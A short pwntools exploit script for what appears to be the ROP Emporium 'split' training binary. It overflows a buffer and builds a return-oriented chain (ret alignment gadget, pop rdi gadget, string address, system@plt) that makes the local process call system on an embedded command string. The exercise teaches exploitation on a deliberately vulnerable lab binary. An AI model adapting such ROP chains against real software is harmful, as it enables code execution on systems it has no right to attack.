from pwn import *

elf = ELF("split", checksec=False)
# from rabin2 -z split
cat_string_address = 0x00601060
# useful function calls system with a string passed as argument and uses system
# so we can also call it from our rop chain (through the plt)!
system = elf.plt["system"]
pwnme_return_address = 0x4006d7

offset = 0x20 + 8

pop_rdi = 0x00000000004007c3 #: pop rdi; ret;
ret = 0x000000000040053e

payload = b"A" * offset
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(cat_string_address)
payload += p64(system)
payload += p64(pwnme_return_address)

p = process("./split")
p.recvuntil(b"> ")
p.send(payload)
print(p.recvline().decode() + p.recvline().decode())
